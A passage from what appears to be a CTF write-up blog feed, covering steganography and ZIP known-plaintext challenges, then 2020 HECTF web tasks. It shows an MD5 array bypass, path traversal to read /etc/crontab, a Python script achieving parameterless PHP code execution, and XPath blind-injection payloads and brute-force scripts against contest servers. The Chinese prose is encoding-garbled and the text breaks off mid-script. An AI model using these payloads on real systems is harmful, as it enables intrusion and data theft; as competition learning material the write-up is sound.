keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'1'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>a1<span class="token operator">&amp;&amp;</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> </code></pre><p>å¾—åˆ°<code>011100110011001101100011011110110100110101100001011011100100001101101000010001010111001101110100011001010111001001011111011101110011000101110100011010000101111100110000001100010011000001111101</code><br>å¤åˆ¶å»äºŒè¿›åˆ¶è½¬å­—ç¬¦ï¼Œç›´æ¥å‡ºç­”æ¡ˆ</p><img src="/article/S3cCTF-gyy-Writeup/2020112220515011.png" class="" title="man" loading="lazy"><hr><h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><h3 id="å‡ºé¢˜è§£æ-12"><a href="#å‡ºé¢˜è§£æ-12" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>æ°´é¢˜ï¼Œè€ƒå¯ŸçŸ¥è¯†é¢ï¼Œå’Œæœç´¢â€¦</p><h3 id="è§£é¢˜æ–¹å¼-12"><a href="#è§£é¢˜æ–¹å¼-12" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>çœŸçš„æ°´é¢˜ï¼Œæœç´¢æ ‡é¢˜<code>SlientEye</code>ï¼Œæ˜¯çš„ï¼Œè¿™æ˜¯ä¸ªè½¯ä»¶<br>é»˜è®¤è®¾ç½®è§£å¯†ï¼Œç›´æ¥å‡ºç­”æ¡ˆ</p><img src="/article/S3cCTF-gyy-Writeup/20201122205451153.png" class="" title="slient" loading="lazy"><hr><h2 id="Plaintext"><a href="#Plaintext" class="headerlink" title="Plaintext"></a>Plaintext</h2><h3 id="å‡ºé¢˜è§£æ-13"><a href="#å‡ºé¢˜è§£æ-13" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>å†™çš„å¾ˆæ¸…æ¥šï¼Œæ˜æ–‡æ”»å‡»<br>ç»™äº†hintï¼Œæš—ç¤ºä¼ªåŠ å¯†<br>å¼€èµ›é¢˜åšæŒäº†è¿™ä¹ˆä¹…æˆ‘æ²¡æƒ³åˆ°â€¦</p><h3 id="è§£é¢˜æ–¹å¼-13"><a href="#è§£é¢˜æ–¹å¼-13" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>æ‰“å¼€å‘ç°å‹ç¼©åŒ…ä¸‰æ–‡ä»¶å…¨åŠ å¯†ï¼Œå‹ç¼©åŒ…é‡Œçš„æ³¨é‡Š</p><pre class="language-none"><code class="language-none">äº²çœ¼æ‰€è§ï¼Œäº¦éçœŸå®ä¹Ÿè®¸æ˜¯è™šä¼ªçš„ï¼Œä¹Ÿè®¸éœ€è¦AZPR</code></pre><p>æ˜ç¤ºè½¯ä»¶AZPRï¼Œè¿™æ˜¯ä¸ªçˆ†ç ´è½¯ä»¶<br>ä¼ªåŠ å¯†ç™¾åº¦æœ‰ä¸€ç¯‡å¾ˆè¯¦ç»†çš„æ–‡ç« <br>ä¿®æ”¹åŠ å¯†ä½ä¸º<code>00</code>ï¼Œä¸çŸ¥é“å“ªä¸ªæ–‡ä»¶æ˜¯ä¼ªåŠ å¯†ç›´æ¥æ‰€æœ‰åŠ å¯†ä½ä¸º<code>00</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122210335385.png" class="" width="00" loading="lazy"><p>ä¿å­˜åè§£å‹åªæœ‰å‰¯æœ¬é‚£ä¸ªæ–‡ä»¶å¯ä»¥ä¿å­˜ï¼Œå…¶ä»–ä¸¤ä¸ªæ–‡ä»¶æ˜¯çœŸåŠ å¯†</p><img src="/article/S3cCTF-gyy-Writeup/20201122210502282.png" class="" width="00" loading="lazy"><p>æ ¹æ®æ˜æ–‡æ”»å‡»æ–¹æ³•ï¼Œå°†è¿™ä¸ªæ–‡ä»¶æ‰“åŒ…zipç„¶åå»é¢˜ç›®å†ä¸‹ä¸€éåŸæ–‡ä»¶,æ­¤æ—¶æ–‡ä»¶è¢«ä¿®æ”¹ï¼Œä¹Ÿå¯ä»¥æ”¹å›å»</p><p>ç”¨AZPRé€‰æ‹©æ˜æ–‡æ”»å‡»å³å¯</p><img src="/article/S3cCTF-gyy-Writeup/20201122210917960.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><p>å¯ä»¥çœ‹åˆ°å¯†é’¥è¢«æ¢å¤äº†ï¼Œä¸ç”¨æ‰¾å¯†ç äº†ï¼Œç›´æ¥å¯ä»¥ä¿å­˜</p><img src="/article/S3cCTF-gyy-Writeup/20201122211504935.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><p>ä¿å­˜æ–‡ä»¶ï¼Œå…¶å®å·²ç»ç ´è§£å‡ºæ¥äº†</p><img src="/article/S3cCTF-gyy-Writeup/20201122210823677.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><p>æˆ–è€…ç”¨rbkcrackä¹Ÿå¯ä»¥<br>ç›´æ¥æ‰“å¼€flag.txtå¾—flag</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 HECTF Write-up</title>
      <link href="article/2020-HECTF-Write-up/"/>
      <url>article/2020-HECTF-Write-up/</url>
      
        <content type="html"><![CDATA[<h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>æŠ¢äº†åˆ°äººç”Ÿç¬¬ä¸€æ¬¡å¤§ä¸€ç‚¹ç‚¹æ¯”èµ›çš„ä¸€è¡€</p><img src="/article/2020-HECTF-Write-up/1.png" class="" title="first" loading="lazy"><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p><p>æ‰“å¼€å‘ç°<code>nonono ï¼Œonce againï¼</code></p><p>æŸ¥çœ‹æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono ï¼Œonce againï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flagä¸åœ¨<span class="token operator">/</span>flagä¸­å“¦ï¼Œä½ åº”è¯¥æ‰¾æ‰¾å¥‡å¥‡æ€ªæ€ªçš„æ–‡ä»¶å<span class="token operator">--</span><span class="token operator">></span></code></pre><p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>è€MD5å¼ºç±»å‹æ¯”è¾ƒï¼Œä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆMD5åŠ å¯†æ—¶æŠ¥é”™äº§ç”ŸNULL=NULLçš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒã€‚<br>å³<code>a[]=1&amp;b[]=a</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053" loading="lazy"><p>è®¿é—®./3b8cf4731c36d20776c76e20f9c774c7.php</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token double-quoted-string string">"/xxx"</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ä½ éœ€è¦çŸ¥é“å†™å…¥çš„æ–‡ä»¶åï¼ï¼ï¼ï¼ï¼æˆ‘çŒœä½ çŸ¥é“åˆ°è¿™ä¸ªæ–‡ä»¶å«ä»€ä¹ˆ,è®°å¾—åŠ ä¸Šç»å¯¹è·¯å¾„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"great!!!!ä½ éœ€è¦çœ‹çœ‹æºç "</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ä½ éœ€è¦çŸ¥é“å†™å…¥çš„æ–‡ä»¶åï¼ï¼ï¼ï¼ï¼æˆ‘çŒœä½ çŸ¥é“åˆ°è¿™ä¸ªæ–‡ä»¶å«ä»€ä¹ˆ<span class="token punctuation">,</span>è®°å¾—åŠ ä¸Šç»å¯¹è·¯å¾„</code></pre><p>ç¬¬ä¸€ååº”çŒœæ–‡ä»¶ï¼Œçˆ†ç ´åŠå¤©å‡ºä¸æ¥<br>ç„¶åå»æ‰«ç›®å½•ï¼Œå‘ç°äº†/etcç­‰ç›®å½•ï¼Œåæ¥æ¯”èµ›æ–¹ç»™äº†hintï¼Œ<code>/etc/crontab</code></p><p>``./../../../etc/crontab`è®¿é—®å¾—</p><pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php</code></pre><p>å¾ˆæ˜æ˜¾<code>/very_g00d_Y0u_got_it.php</code></p><p>è®¿é—®å¾—å•¥éƒ½æ²¡æœ‰ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡å†™ä¸œè¥¿è¿›å»ã€‚<br>ç„¶åå›ä¸Šä¸€æ­¥åˆ†ææºç ï¼Œ<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>ä»dataå‚æ•°ä¸­åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œå…¶å®å°±æ˜¯â€™\w+â€™ï¼Œç„¶ååœ¨åŒ¹é…ä¸€ä¸ªå¾ªç¯çš„â€™()â€™ï¼Œå°†åŒ¹é…çš„æ›¿æ¢ä¸ºNULLï¼Œåˆ¤æ–­å‰©ä¸‹çš„æ˜¯å¦åªæœ‰â€™;â€™ã€‚</p><p>å¾ˆæ˜æ˜¾æ— å‚æ•°RCEï¼Œç¼–å†™è„šæœ¬ï¼Œé¦–å…ˆ<code>print_r(getcwd());</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187" loading="lazy"><p>è®¿é—®<code>/very_g00d_Y0u_got_it.php</code>å¾—<code>/</code>ï¼Œè¯´æ˜å½“å‰å·¥ä½œç›®å½•ä¸ºæ ¹ç›®å½•</p><img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943" loading="lazy"><p>ç„¶å<code>print_r(scandir(getcwd()));</code>æ‰«ä¸€ä¸‹ç›®å½•</p><pre class="language-none"><code class="language-none">Array(    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; .dockerenv    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg    [5] &#x3D;&gt; bin    [6] &#x3D;&gt; boot    [7] &#x3D;&gt; dev    [8] &#x3D;&gt; etc    [9] &#x3D;&gt; flag    [10] &#x3D;&gt; home    [11] &#x3D;&gt; index.php    [12] &#x3D;&gt; lib    [13] &#x3D;&gt; lib64    [14] &#x3D;&gt; media    [15] &#x3D;&gt; mnt    [16] &#x3D;&gt; opt    [17] &#x3D;&gt; proc    [18] &#x3D;&gt; root    [19] &#x3D;&gt; run    [20] &#x3D;&gt; sbin    [21] &#x3D;&gt; srv    [22] &#x3D;&gt; start.sh    [23] &#x3D;&gt; sys    [24] &#x3D;&gt; tmp    [25] &#x3D;&gt; usr    [26] &#x3D;&gt; var    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php)</code></pre><img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000" loading="lazy"><p>å‘ç°å¼‚å¸¸æ–‡ä»¶<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>ï¼Œè®¿é—®åå¾—åˆ°äº†flag</p><img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419" loading="lazy"><p>æœ€åbase64ä¸€ä¸‹å‘ç°<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>å°±æ˜¯<code>fl4gggggggggggg</code></p><p>Payloadï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span><span class="token punctuation">&#125;</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span></code></pre><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p><p>é¢˜ç›®æç¤ºä¸ºæ³¨å…¥ï¼Œè¿›å…¥ç•Œé¢ä¸ºç™»é™†æ¡†ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°SQLæ³¨å…¥</p><img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941" loading="lazy"><p>è¾“adminç™»é™†ä¸€ä¸‹</p><img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397" loading="lazy"><p>æ˜¯GETä¼ å‚ï¼Œsqlmapè·‘ä¸€ä¸‹æ²¡æœ‰ç»“æœï¼Œä¸‡èƒ½å¯†ç <code>1&#39;or 1=1</code>è¯•ä¸€ä¸‹æˆåŠŸ</p><img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642" loading="lazy"><p>æ€€ç–‘æ˜¯XXEï¼Œå°è¯•äº†ä¸€ä¼šå‘ç°ä¸æ˜¯ã€‚<br>åæ¥æƒ³åˆ°XPathæ³¨å…¥(å‚»äº†ï¼ŒæŠ¥é”™é‡Œæœ‰â€¦)</p><p>XPathåŸºç¡€æŸ¥è¯¢è¯­å¥<code>//users/user[loginID/text()=â€™abcâ€™ and password/text()=â€™test123â€™]</code></p><p>è¿™æ˜¯ä¸€ä¸ªXPathæŸ¥è¯¢è¯­å¥ï¼Œè·å–loginIDä¸ºabcçš„æ‰€æœ‰useræ•°æ®ï¼Œç”¨æˆ·éœ€è¦æäº¤æ­£ç¡®çš„loginIDå’Œpasswordæ‰èƒ½è¿”å›ç»“æœã€‚å¦‚æœé»‘å®¢åœ¨ loginID å­—æ®µä¸­è¾“å…¥ï¼šâ€™ or 1=1 å¹¶åœ¨ password ä¸­è¾“å…¥ï¼šâ€™ or 1=1   å°±èƒ½ç»•è¿‡æ ¡éªŒï¼ŒæˆåŠŸè·å–æ‰€æœ‰useræ•°æ®</p><p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p><p>å…·ä½“ä¸åšé˜è¿°</p><hr><p><strong>å°è¯•XPathç›²æ³¨</strong></p><p>ä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹:</p><p>1.åˆ¤æ–­æ ¹ä¸‹èŠ‚ç‚¹æ•°:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 1</p><p>2.çŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>â€¦</p><p>result: root</p><p>3.åˆ¤æ–­rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹æ•°:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 2</p><p>4.çŒœè§£rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: users,secret</p><p>é‡å¤ä¸Šè¿°æ­¥éª¤,ç›´åˆ°çŒœè§£å‡ºæ‰€æœ‰èŠ‚ç‚¹.æœ€åæ¥çŒœè§£èŠ‚ç‚¹ä¸­çš„æ•°æ®æˆ–å±æ€§å€¼.</p><p>çŒœè§£idä¸º1çš„userèŠ‚ç‚¹ä¸‹çš„usernameå€¼,</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>â€¦</p><p>result: admin</p><hr><p>å†™è„šæœ¬å¼€å§‹è·‘<br>é¦–å…ˆåˆ¤æ–­æ ¹ä¸‹èŠ‚ç‚¹æ•°<br>å› ä¸ºæ˜¯GETä¼ å‚ï¼Œç›´æ¥è®¿é—®<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=ç™»å½•</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706" loading="lazy"><p>è¿™ä¸ªç»“æœåº”è¯¥æ˜¯return 1ï¼Œå³æ ¹ä¸‹æœ‰ä¸€ä¸ªèŠ‚ç‚¹</p><p>å¦‚æœæ¢æˆ<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>åˆ™ä¼šè¿”å›ç™»å½•å¤±è´¥ï¼Œå³ç»“æœä¸ºreturn 0.</p><p>ç»§ç»­çŒœæµ‹ç¬¬ä¸€çº§èŠ‚ç‚¹ï¼Œç”¨è„šæœ¬è·‘</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=ç™»å½•"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># !####! æ¢æˆç›®å½•å³å¯</span></code></pre><p>ç»“æœçˆ†å‡ºç¬¬ä¸€çº§ä¸ºroot</p><img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719" loading="lazy"><p>åŒç†ï¼Œä¿®æ”¹ç¬¬13è¡Œä¸º<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>ç»§ç»­çˆ†</p><img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627" loading="lazy"><p>æœ€åçˆ†å‡ºç»“æ„ä¸º/root/users/user[id]</p><p>å¼€å§‹çŒœæµ‹idä¸º1çš„userèŠ‚ç‚¹ä¸‹usernameå€¼ï¼Œå…¶å®èƒ½çŒœåˆ°çš„admin</p><p>payloadï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=ç™»å½•"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token 